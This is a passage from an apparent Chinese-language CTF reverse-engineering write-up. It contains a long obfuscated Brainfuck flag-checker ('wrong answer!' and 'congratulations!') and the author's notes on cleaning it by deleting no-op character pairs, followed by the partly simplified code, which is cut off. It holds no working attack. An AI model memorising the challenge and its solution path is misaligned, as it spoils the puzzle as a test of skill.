&quot;&gt;&lt;&gt;&lt;--+-+--&lt;&gt;-+---+&gt;&lt;&gt;&lt;-+-+--&gt;&lt;-&gt;&lt;-+-+&gt;&lt;--+&gt;&lt;-+--&gt;&lt;&lt;&gt;--+-++--+&lt;&gt;&gt;&lt;&gt;+--+-&lt;&gt;]+-&lt;&gt;&lt;&gt;-+&lt;-+-+-&gt;&lt;&lt;&gt;+-&lt;&gt;-+[&quot; &quot;&lt;&gt;-+-+&gt;&lt;&lt;-++-&lt;&gt;+-+-++-+-&gt;&lt;&gt;-+&lt;&gt;&gt;&lt;[&lt;&gt;-+-&gt;&lt;+-][[+&gt;.[,-+]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-+-[&lt;&quot; &quot;.&lt;[&gt;.[...-],]+&gt;[+--[&gt;---,]&gt;-&lt;[-,&lt;&gt;]...].]+&lt;][&lt;&lt;[&gt;&lt;+&lt;-[+&lt;[&gt;-.+&lt;&gt;&gt;]+,]+&gt;,]]]&lt;,]+-,]&lt;+].--]&lt;]+-+-+--+]&gt;&quot; &quot;&lt;+--+&lt;&gt;&gt;&lt;,+-+-&gt;&lt;-+-+&gt;+&gt;&lt;-+-++-&lt;&gt;++&lt;&gt;&gt;&lt;+&lt;&gt;-+-++&lt;&gt;+&lt;&gt;[-+-+&lt;-+-++-&gt;&lt;--+&lt;&gt;-&gt;&lt;&lt;&gt;+--&lt;&gt;-&gt;&lt;--+--+-+-+&lt;&gt;&lt;&gt;-+-&quot; &quot;&lt;&gt;+-&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-+&gt;-&gt;&lt;-+-++--+]-+-+-+&lt;+--++-&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;[&lt;+-+--+&gt;&lt;+&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;+--+&gt;&lt;-++-[&lt;&gt;&lt;&gt;-+&quot; &quot;--+&lt;&gt;-+][+&gt;[-.&lt;[[+[+-&gt;,+.,&gt;]&gt;+-]&gt;[+[++,&gt;[,,[+[.&lt;&gt;&gt;.[&gt;,]+]&lt;&lt;]-.&gt;+-]&gt;-].-&gt;++],]&gt;[&gt;[.[-&gt;&lt;+&gt;.+],].,[&lt;[-&lt;&quot; &quot;,[[[&gt;&lt;-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[-+[,&gt;...,]-,]&lt;&lt;[[+-&lt;&lt;&gt;]&gt;.]&lt;]&quot; &quot;.+&gt;]-]-.]+],&lt;&gt;]&gt;&lt;+-&lt;&gt;&lt;&gt;][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+&gt;&lt;[[&lt;+-+&gt;[+]&lt;&lt;]---[..[,+-&lt;].&gt;&lt;],&lt;]]]+-.&gt;]&gt;]-&quot; &quot;&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;],+--+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;-+-++-++-+&gt;&lt;+-&gt;&lt;&gt;&lt;+&gt;&lt;+--+-+&lt;&gt;+&lt;&gt;[&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;+--+-+-&gt;&lt;&gt;&lt;+-&quot; &quot;---++--+-&gt;&lt;&lt;&gt;-+&gt;&lt;&gt;&lt;-+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-&gt;&lt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;-&lt;&gt;+-]-+&lt;&gt;+-&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;&lt;&gt;-+-+-[-+-+&gt;&lt;+&quot; &quot;-&lt;+-+-+-+-+-+&gt;[+--+&gt;&lt;&gt;&lt;-]][[[,[,,-,,.][.+--&gt;+&lt;],]++&gt;&gt;&lt;,]-]&gt;&lt;-+&lt;&gt;-+&gt;&lt;,&gt;+&gt;&lt;&gt;&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;++&lt;&gt;++-&lt;&gt;&lt;&gt;+-[&quot; &quot;-+-+&gt;&lt;&lt;-+-&lt;&gt;&lt;&gt;+--+-+--+-+&gt;&lt;&lt;&gt;&gt;&lt;--+&lt;&gt;+-+--+-+---+-+&gt;&lt;&gt;&lt;-+-&gt;&lt;-+&gt;&lt;-+-+-+--+-+--+&lt;&gt;-+---&lt;&gt;&lt;&gt;--+&gt;&lt;&lt;&gt;+-&gt;&lt;-&quot; &quot;---+&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&lt;&gt;--&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;--++-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+--]&lt;&gt;&lt;&gt;&lt;-++--+--&gt;&lt;&lt;&gt;&gt;&lt;[&lt;+&lt;&gt;&gt;[&gt;&lt;+-+--][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]&quot; &quot;&lt;&gt;-+-+&gt;&lt;-+][[&gt;+-]+.+,]+-+-,&gt;&lt;&gt;++&lt;&gt;+-&lt;&gt;+&gt;&lt;+--++-++-++++-&lt;&gt;-+&lt;&gt;+-+&gt;&lt;-++-+-[-+&lt;-&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;&quot; &quot;-+-++--+---++-&gt;&lt;-+-+----+&lt;&gt;+--&gt;&lt;-+-+-+-&lt;&gt;&lt;&gt;-+-&lt;&gt;-+&gt;&lt;-+&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;]-++-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;+--+&lt;&gt;-&gt;&lt;-&gt;&quot; &quot;&lt;&lt;&gt;[&lt;&gt;-++-&lt;+-&gt;&lt;&lt;&gt;+&gt;+-+-[-]-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;&lt;&gt;,-++-&lt;&gt;+-&gt;-+&gt;&lt;+-&lt;&gt;&gt;&lt;++&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&lt;&gt;+-+&gt;&lt;-++-&lt;&gt;[+-&lt;-&lt;&gt;-&quot; &quot;+--&lt;&gt;-+-+&gt;&lt;&lt;&gt;-&lt;&gt;+---+--+--+&gt;&lt;+--+-+-&gt;&lt;&lt;&gt;-+--+&lt;&gt;--+&gt;&lt;&lt;&gt;&gt;&lt;-+--+&lt;&gt;-&gt;&lt;-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;+-&gt;&lt;--+&lt;&gt;+-+----+&quot; &quot;-+-+-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&gt;&lt;&gt;-++-&gt;&lt;-]-+&gt;&lt;+-&gt;&lt;&lt;&lt;&gt;--+--+&gt;&lt;-+[&lt;&gt;&lt;+-++-&lt;&gt;&gt;&gt;&lt;-++-&lt;&gt;[+-&lt;&gt;-&gt;&lt;+-&gt;&lt;&gt;&lt;][+[[[,--[[[+.&gt;&lt;&quot; &quot;]-&gt;]&lt;-&lt;.]&gt;&lt;[-[-&gt;&gt;&gt;[&lt;&lt;&gt;[+,&gt;[,+[++-]+.&gt;][-&gt;&lt;..],]&lt;&gt;[,,.[&lt;,-[+]&gt;+&gt;&lt;+]-,+]++]&lt;],].&gt;&lt;][+,&gt;,-[&lt;,.[&lt;&lt;[-[+-,&quot; &quot;&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]+--]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-&gt;&lt;].&lt;].&gt;,]&gt;&lt;]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]+-&lt;&gt;&lt;&quot; &quot;&gt;&gt;&lt;-+]+-,+-&lt;&gt;+-&lt;&gt;&gt;+-++&lt;&gt;&lt;&gt;-++-+&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;+-++++&lt;&gt;+-&lt;&gt;&gt;&lt;+&lt;&gt;+-[&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;--&gt;&lt;+-&gt;&lt;&gt;&lt;--+&gt;&lt;&gt;-]&gt;&quot; &quot;&lt;&gt;&lt;&lt;+-+-+-+---++--+-+--+&gt;&lt;+---++-&gt;&lt;+-&gt;&lt;-&gt;&lt;-+&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+-&lt;&gt;&lt;&gt;&gt;&lt;-++--[+-&lt;&gt;&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&gt;&lt;+-&lt;&gt;[&gt;&lt;-&lt;&gt;&lt;&quot; &quot;&gt;-+-+]&lt;&gt;-+][.[,&lt;&lt;-&gt;.]&gt;-+],+-&lt;&gt;&gt;&lt;&gt;-+-+-+++-+&lt;&gt;&lt;&gt;&lt;&gt;-+++--++-++-&lt;&gt;&gt;&lt;&lt;&gt;++-+-+++--+&lt;&gt;-++[+--+&lt;-+-++---+&gt;&lt;&quot; &quot;-+-&lt;&gt;+-+-&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;&gt;&lt;-&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+-+--&lt;&gt;+--+-&lt;&gt;-&gt;&lt;+-+--&lt;&gt;+-&gt;&lt;&gt;&lt;-+--+-+&lt;&gt;-&gt;-&gt;&lt;&lt;&gt;+--+][]+--+&quot; &quot;&gt;&lt;&lt;-&lt;&gt;-+-[&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-+--++-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;-+&lt;&gt;[&gt;&lt;&lt;&gt;-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.][--++&lt;&gt;].]-[+-&lt;+]+&quot; &quot;..]&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;,&gt;&lt;+-&gt;&lt;-+&gt;&lt;&gt;+&lt;&gt;+++--+++&gt;&lt;-+-+&lt;&gt;+-+-+[+-+-+-&gt;&lt;&lt;+-&lt;&gt;+--&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+---+&lt;&gt;-+--&gt;&lt;--+&lt;&gt;-&gt;&lt;&gt;&lt;-&quot; &quot;&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&gt;&lt;+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;-+-&gt;&lt;-&gt;&lt;-+--+&lt;&gt;&gt;&lt;&lt;&gt;--++--+&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+--+-&gt;&lt;-&gt;+-&gt;&lt;+--&gt;&lt;+--+&lt;&gt;]-+&gt;&lt;&quot; &quot;&lt;&gt;+-&lt;+-----+-&gt;&lt;-+-[&lt;+&gt;&lt;&lt;&gt;+-&gt;&gt;&lt;+-&lt;&gt;+--+[--+&lt;&gt;+-]]+&gt;&lt;-+&lt;-+[+-w&gt;&lt;-+&lt;&gt;r+-&gt;&lt;&lt;&gt;o&gt;&lt;-++-+-n-+-+g a-++-n&lt;&gt;s&gt;&lt;&quot; &quot;-+&lt;&gt;w-+&lt;&gt;&gt;&lt;+-e&gt;&lt;r-++-&gt;&lt;-+-+!&gt;&lt;-+-+&gt;&lt;&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;[+-&gt;&lt;&lt;&gt;--+][+[+[[.[&gt;[+,,[&gt;&lt;[[+&gt;+&lt;++]+&lt;&gt;,+],,&gt;&gt;&gt;]+],+.&quot; &quot;,+].],+,[-,-[.-+]--,&gt;,-].&lt;][-.[+&lt;[[&gt;-+[[.,+&lt;-[,..-&gt;],,+]--+[.--&lt;]][.[+&gt;,[&lt;+-[.+&gt;,&gt;.+,]&gt;&lt;,]&lt;&gt;]+[&gt;+-&lt;+&quot; &quot;+]&gt;]&gt;]&gt;+-]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;+-]&gt;]],&gt;.[&lt;,&lt;&gt;&lt;+-.]++&lt;]+--++-&lt;&gt;+-&lt;-+&gt;&lt;[+--+-+-&lt;&gt;-+]&lt;&gt;][--++&gt;...,]-+&gt;&lt;&gt;&lt;+-&gt;[&lt;&gt;&quot; &quot;&lt;&gt;&gt;&lt;-+c&lt;&gt;&lt;&gt;+-&gt;&lt;&gt;&lt;o&gt;&lt;-+&lt;&gt;-+n&gt;&lt;&lt;&gt;-++-g&lt;&gt;ra&gt;&lt;+-+-t+-&gt;&lt;-+&lt;&gt;&gt;&lt;ul&lt;&gt;at&lt;&gt;&gt;&lt;-++-io&lt;&gt;ns-+!-+&gt;&lt;-++-[&lt;&gt;+--+&lt;&gt;&gt;&lt;-&quot; &quot;&gt;&lt;&gt;&lt;-+][&lt;.+&gt;.+]][]&quot; );&#125; 看上去很复杂，并且我不会写脚本去混淆啥的，只能手动去混淆了。代码部分拖到sublime里，然后搜索&gt;&lt; &lt;&gt; +- -+，全部重复删个几遍。有很多输入应该是无效的，发现有效的输入会是类似,&gt;++++++++[&lt;-------&gt;-]这样的，然后排列了一下，得到： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----[&lt;+&gt;[-][.&gt;&gt;[&lt;-,[[+[-&lt;.[-]-,+].[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]]+]&lt;.-].[&gt;[-.,.,[&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[+[+][.,.&gt;,]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[.[,&lt;[,,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]-]-&lt;,&lt;]-]-.&gt;],]-&lt;]][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;,].]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].]]],&gt;+++++[&lt;--------------------&gt;-]&lt;---[&lt;+&gt;[-][.[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&lt;.]+]&lt;[.&lt;.+[,[.,.+]..+]&gt;,-]-]&gt;--]],&gt;+++++[&lt;-------------------&gt;-]&lt;--[&lt;+&gt;[-][,&gt;&gt;]],&gt;+++++++[&lt;---------------&gt;-][-[.&gt;[,,&lt;[.,.[,[&gt;[.,+].-][&lt;.[&gt;[,&lt;[+]&gt;[-[.&lt;&lt;+.-]-[&gt;],]+][[+&gt;[&lt;,&lt;]]]++]++++]][+[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]&lt;----[&lt;+&gt;[-]],&gt;+++++++++[&lt;-----------&gt;-][[&gt;[&gt;[+.[.[-[[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;--[&lt;+&gt;[-]],&gt;++++++++[&lt;---------------&gt;-][..,,]&lt;---[&lt;+&gt;[-]][&gt;],&gt;++++++++[&lt;------------&gt;-][&gt;&gt;-]&lt;-----[&lt;+&gt;[-][[[--.[-.-&gt;[&lt;,.,[++&gt;]]&lt;]-.[.,[.]&gt;[&lt;[[&gt;&gt;-][&gt;-.[,+&lt;&lt;[[--,+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,+&lt;]&gt;[-&lt;.+]&gt;&gt;],[-,[&lt;]+&lt;]&lt;.]]-].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]],&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-][[&lt;&lt;[,-.[&lt;+,&lt;]&gt;+],&lt;-,]+.++,.]],&gt;++++++[&lt;--------&gt;-]&lt;-----[&lt;+&gt;[-]],&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-][,&lt;+,]],&gt;+++++++++[&lt;-----------&gt;-][-&gt;]&lt;--[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-]&lt;-[&lt;+&gt;[-][&lt;-.[&lt;[[.,[...],],.]&gt;,&lt;-.]]],&gt;+++++++[&lt;-------&gt;-]&lt;-[&lt;+&gt;[-]][&gt;,,-],&gt;+++++++[&lt;-------&gt;-][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&gt;,.[[&gt;.[.&lt;.,.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;].+&gt;]]&lt;[&lt;+&gt;[-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[,[.&lt;,&gt;].,,[&lt;..]&gt;]..]&lt;.++].]]&lt;]+],&gt;]-..]],&gt;+++++[&lt;-----------&gt;-][[-.&gt;-&gt;+.][[+[+[+&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;[,[-,,]&gt;[&lt;,&gt;]&lt;]]]][-[,[-,[+&gt;[&gt;,+&lt;].[..-]]+]&lt;.]&gt;]..]]+.+[-[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[...,],]+&gt;,&gt;]-]--&lt;]&lt;++]&lt;-[&lt;+&gt;[-][&gt;[,[&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]-]&gt;[&gt;-[,+[,,[+[.+]+][.,.[+&lt;-]-]+]-&lt;.]&gt;-.&gt;]][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.],]-&lt;-[&lt;-[[[&gt;&gt;&gt;[,&gt;&gt;.[.&lt;+[&gt;&gt;,[.++&gt;]++]]&lt;],][+.&gt;]]+,[&gt;[,&gt;+&gt;+[,,-[-&gt;+[&gt;&gt;[+.&gt;[+,.]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]][&gt;.+],&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-]][&gt;,&lt;,&gt;.],&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;+++++[&lt;---------&gt;-][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;]&gt;-[.]][&lt;+&lt;,--]&lt;+].,&gt;][&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;---[&lt;+&gt;[-][+&gt;-&lt;+]],&gt;++++++[&lt;----------------&gt;-][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&gt;-]],&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,],]]].]&lt;,.]&lt;--[&lt;+&gt;[-][.&gt;+[&gt;[.+,[[-&lt;.,&lt;[+,-.]]].,-]&gt;[--&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[[[,.]-[.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.[&lt;,-&gt;]&lt;-],,]]+,],-]&lt;]-&gt;,]&gt;&gt;].]][&lt;&lt;],&gt;++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.]].]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+]&gt;.&lt;]&lt;&lt;,.][.+]&gt;,&lt;],-,],]].&lt;.].+]&lt;]][+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+],.+]&lt;.],&gt;+++++++++[&lt;------&gt;-][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;[-,,[&lt;-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;++]++&lt;]+,,][+.-&gt;]-][..,]&gt;&gt;-]&lt;--[&lt;+&gt;[-]],&gt;++++++++++[&lt;-----&gt;-][.[[.++&gt;[&gt;.[++.&gt;][,&lt;[.[[&lt;[+&gt;&gt;+[.&lt;.-]&gt;][-].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[.---&lt;+.]]&lt;-[&lt;+&gt;[-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[,--][&gt;,[--,&gt;.]&lt;]-.-]+.]],&gt;+++++++[&lt;-------&gt;-]&lt;[&lt;+&gt;[-][+&gt;-[&gt;[[+&gt;,.+].&lt;]]-[,-]&lt;,.]],&gt;++++++++++[&lt;---------&gt;-][[-&lt;-[+[&lt;.[.&gt;,.&gt;]&gt;,&lt;-]-&gt;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;-------[&lt;+&gt;[-][+[-,&lt;+],-]],&gt;++++++[&lt;--------&gt;-][.-[-[-&gt;.&gt;+,][-]-,,]&lt;]&lt;---[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-][..&lt;-]&lt;--[&lt;+&gt;[-][&gt;[--][.&gt;-,--]-]],&gt;++++++++[&lt;-------&gt;-][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.].]&lt;-[&lt;+&gt;[-][&lt;-&lt;[&gt;&gt;].]],&gt;++++++++[&lt;------------&gt;-][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;[-,[+.[[[.[,],[-&lt;,&gt;-]].-.]&lt;-[,+&gt;[.[+.+]],]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;---[&lt;+&gt;[-][.[,[[.&lt;[[++]+.-],++,.]++].,,].[.[&lt;[&gt;,&gt;+]&lt;+]&lt;]]][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[&lt;.,--]&gt;],]&gt;+&gt;-&gt;][-&lt;[[+[[&gt;&gt;,.&lt;]&lt;]]+[+.[++,&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&gt;&gt;[+&gt;[++&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,,&gt;+]]].--],++].]&lt;]&gt;-[+,+&gt;.],--],&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]],&gt;+++++++[&lt;--------&gt;-]&lt;[&lt;+&gt;[-][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]]+[&lt;,[&lt;+[-&lt;]]+]+],..[+[.+&lt;[+[-[&gt;-,.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]][&lt;[[.[-,,[.,&gt;[.,--]&gt;]+.&gt;],+[+&gt;]],&lt;+]&gt;],&gt;+++++++[&lt;-------&gt;-][,&gt;-,,+&lt;]&lt;-----[&lt;+&gt;[-][+,[-&gt;-,&gt;--..][,+[&lt;[&lt;+&lt;[,[[.,,,[,[&lt;[-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;.&gt;],,-&lt;+,]-&lt;-]&gt;+[[+.][+[&lt;[&lt;[--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]+]+&gt;&gt;]],&gt;+++++++[&lt;--------------&gt;-]&lt;[&lt;+&gt;[-]][&gt;+],&gt;++++++++++[&lt;-----&gt;-]&lt;-[&lt;+&gt;[-][[[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;][&gt;+,,]&gt;&gt;,]][&lt;&lt;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+]],&gt;++++++++++[&lt;-----&gt;-][&gt;..&gt;,]&lt;-----[&lt;+&gt;[-][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[++,,+&lt;]+.&lt;],&gt;.]&gt;--],&gt;++++++++++[&lt;----------&gt;-][[+[.[,++.]&gt;]]-,-]&lt;-[&lt;+&gt;[-][.[+,&gt;-[&lt;[&gt;-[-.&lt;,&gt;].+,]&gt;]]+&gt;[.[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,]&lt;+&lt;]]]],&gt;++++++++++[&lt;-----&gt;-][&gt;&gt;[++,&lt;]-.,]&lt;----[&lt;+&gt;[-]][+[+&lt;,+[[+.[+[&lt;][++[[&lt;,[[.&gt;,&gt;-]+],&lt;].--]..],,-],&lt;+]++&gt;-]&gt;,,].&gt;.],&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][+.[--,&gt;+],],&gt;++++++++[&lt;------&gt;-][,.-[.,+[&lt;[,[,+[.&gt;[-&gt;+[[+[-],[-,-]-][.+,&lt;[,+.&gt;..]]]]+.-,-]&lt;,]&gt;[+[[,-.,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;[-[&lt;[&gt;+&lt;&lt;++&lt;]],]]],,-&gt;-]&lt;]&gt;+&lt;]&lt;-------[&lt;+&gt;[-]],&gt;+++++[&lt;--------------------&gt;-]&lt;[&lt;+&gt;[-]][.+.+],&gt;++++++++++[&lt;-----&gt;-][&gt;-,[&gt;.+&lt;--]&lt;.[+[&lt;&lt;[&lt;[--&lt;[-&lt;],.[[-&gt;,.],&gt;&gt;]&lt;.+].,]++]+[&gt;,[[[[.]&lt;-].-,],]]&gt;]&gt;]&lt;--[&lt;+&gt;[-][[.,&gt;-[.&lt;,[&gt;,[,[[-&gt;[[[--&gt;--.]&gt;,-]&gt;.&gt;]],[.&gt;[,[&lt;.,&gt;[+,,+&lt;&lt;.],+]]--[+.,[&gt;-,[+,]--&gt;]+.].,&lt;]]+]++].[&lt;+.].,+].&gt;-],+]],&gt;++++++++[&lt;------------&gt;-]&lt;---[&lt;+&gt;[-]],&gt;++++++[&lt;---------&gt;-]&lt;---[&lt;+&gt;[-][[-&gt;&gt;[+&lt;.[&gt;&gt;-].&lt;,&lt;],]&lt;]],&gt;++++++++[&lt;------&gt;-][&lt;+&lt;.-&gt;]&lt;[&lt;+&gt;[-][[&lt;+,[+.]+]+.[&lt;[.-]&gt;-],]],&gt;+++++[&lt;-----------&gt;-]&lt;-[&lt;+&gt;[-]],&gt;++++++[&lt;--------&gt;-][[--,[&lt;&lt;-[&gt;[,&gt;.[.,-[.+[&lt;,&lt;-.[-],]&gt;]++.],],,,]&lt;.,].&lt;]-[&gt;[.-&lt;,],,.[&lt;[&lt;-,].+]-]&lt;]&lt;----[&lt;+&gt;[-][-.&lt;]],&gt;+++++++++[&lt;-----------&gt;-]&lt;--[&lt;+&gt;[-]][[[&gt;&gt;+[.]&gt;+]]-.],&gt;++++++++[&lt;------------&gt;-]&lt;------[&lt;+&gt;[-]][&gt;-[.+&lt;[.]+.&lt;[[&gt;,[[+.+&gt;]-&lt;.]+[+,&gt;,&gt;-,]]]]&gt;,-[&gt;-&lt;[-,&lt;-&gt;[&lt;.&gt;[+.[.]&gt;,[,[.-]&gt;]&gt;]+&gt;[[&gt;-,]+].]],&lt;[&lt;&lt;..-].]],&gt;++++++++++[&lt;-----&gt;-][[.[&gt;&gt;-[.&gt;.[[..[+,,]&lt;.&gt;[..+..]+&lt;]]]&gt;&gt;&gt;[[--,-],+&gt;.-]-.]&gt;]]&lt;-[&lt;+&gt;[-]],&gt;+++++++++[&lt;-----&gt;-][,[.[...&lt;,&lt;&lt;+,]]-.]&lt;--------[&lt;+&gt;[-